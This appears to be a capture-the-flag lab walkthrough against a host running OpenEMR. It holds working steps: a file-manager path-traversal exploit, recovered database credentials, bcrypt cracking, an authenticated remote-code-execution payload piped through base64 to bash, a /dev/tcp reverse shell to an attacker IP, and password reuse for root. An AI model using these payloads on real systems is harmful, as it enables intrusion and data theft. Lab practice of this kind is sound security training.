@@ -1,0 +1,147 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.126.145 > Apex.txt
+PORT     STATE SERVICE     VERSION
+80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: APEX Hospital
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+3306/tcp open  mysql       MariaDB 5.5.5-10.1.48
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
+|   Thread ID: 33
+|   Capabilities flags: 63487
+|   Some Capabilities: Speaks41ProtocolOld, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, ConnectWithDatabase, Support41Auth, FoundRows, LongColumnFlag, Speaks41ProtocolNew, LongPassword, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsCompression, SupportsTransactions, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: D+HgO4W;]CvJN)~cVdr0
+|_  Auth Plugin Name: mysql_native_password
+Service Info: Host: APEX
+
+Host script results:
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time: 
+|   date: 2026-05-20T07:13:39
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
+|   Computer name: apex
+|   NetBIOS computer name: APEX\x00
+|   Domain name: \x00
+|   FQDN: apex
+|_  System time: 2026-05-20T03:13:36-04:00
+|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
+
+$ gobuster dir -u http://192.168.126.145/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,conf -r
+source/Documents
+filemanager
+
+http://192.168.126.145/filemanager/dialog.php?type=0&lang=en_EN&popup=0&crossdomain=0&relative_url=0&akey=key&fldr=&6a0d721012a46&1779266121595
+RESPONSIVE filemanager v.9.13.4
+
+$ searchsploit RESPONSIVE filemanager
+Responsive FileManager 9.13.4 - 'path' Path Travers | php/webapps/49359.py
+Responsive FileManager 9.13.4 - Multiple Vulnerabil | php/webapps/45987.txt
+
+$ curl -s -D - http://192.168.126.145/filemanager/ | grep PHPSESSID
+Set-Cookie: PHPSESSID=fepffoevln61sr6obvafrnq5cr; path=/
+
+$ python3 49359.py http://192.168.126.145 PHPSESSID=fepffoevln61sr6obvafrnq5cr /etc/passwd
+[*] Copy Clipboard
+[*] Paste Clipboard
+root:x:0:0:root:/root:/bin/bash
+white:x:1000:1000::/home/white:/bin/sh
+
+$ smbclient -L //192.168.126.145 -N
+docs            Disk      Documents
+$ smbclient //192.168.126.145/docs -N
+OpenEMR Success Stories.pdf        
+shell.html 
+OpenEMR Features.pdf
+
+# From OpenEMR Features.pdf, we can refer source code from https://github.com/openemr/openemr. Then in above search bar keyin repo:openemr/openemr "$pass" to search any default credential setting and sensitive file location. Found sqlconf.php content creds and location at sites/default/:
+sites/default/sqlconf.php
+$login  = 'openemr';
+$pass   = 'openemr';
+$dbase  = 'openemr';
+$sqlconf["login"] = $login;
+$sqlconf["pass"] = $pass;
+$sqlconf["dbase"] = $dbase;
+
+# The files are same as http://192.168.126.145/source/Documents so we know they are in same directory.
+
+# Review the exploit code 49359 line 36, change to new path so that we can get the file if it cannot type out by original 49359.py script:
+url_paste, data="path=", headers=headers 
+url_paste, data="path=/Documents", headers=headers
+
+$ python3 49359.py http://192.168.126.145 PHPSESSID=9ipgfarpsbc00cgro8r14t2k1t /var/www/openemr/sites/default/sqlconf.php
+# It show 404, but from smbclient, we can found the file is paste there.
+$ smbclient //192.168.126.145/docs -N
+sqlconf.php
+$ cat sqlconf.php
+$host   = 'localhost';
+$port   = '3306';
+$login  = 'openemr';
+$pass   = 'C78maEQUIEuQ';
+$dbase  = 'openemr';
+
+$ mysql -u'openemr' -p'C78maEQUIEuQ' -h 192.168.126.145
+ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
+# Use --skip-ssl for this error                             
+$ mysql -u'openemr' -p'C78maEQUIEuQ' -h 192.168.126.145 --skip-ssl
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 2124
+Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> select * from config;
+admin:$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC:thedoctor
+salt:$2a$05$bJcIfCBjN5Fuh0K9qfoe0n$
+
+$ hashcat -m 3200 '$2a$05$bJcIfCBjN5Fuh0K9qfoe0eRJqMdM49sWvuSGqv84VMMAkLgkK8XnC' /usr/share/wordlists/rockyou.txt
+admin:thedoctor
+
+# login to scheduler with this creds
+http://192.168.126.145/openemr/interface/main/tabs/main.php
+About OpenEMR
+Version Number: v5.0.1 (1)
+OpenEMR 5.0.1 - 'controller' Remote Code Execution  | php/webapps/48623.txt
+OpenEMR 5.0.1 - Remote Code Execution (1)           | php/webapps/48515.py
+OpenEMR 5.0.1.3 - Remote Code Execution (Authentica | php/webapps/45161.py
+
+$ searchsploit -m 45161.py
+# To resolve bytes-like object required for b64encode. Change line 136 to:
+_cmd = "|| echo " + base64.b64encode(args.cmd.encode()).decode() + "|base64 -d|bash"
+
+$ python3 45161.py 'http://192.168.115.145/openemr' -u admin -p thedoctor -c id
+[$] Authenticating with admin:thedoctor
+[$] Injecting payload
+[$] Payload executed
+
+# Run a reverse shell
+$ python3 45161.py 'http://192.168.115.145/openemr' -u admin -p thedoctor -c '/bin/sh -i >& /dev/tcp/192.168.45.178/4444 0>&1'
+
+$ rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.178] from (UNKNOWN) [192.168.115.145] 53610
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+reuse password
+su root
+thedoctor
+
+get root.
+
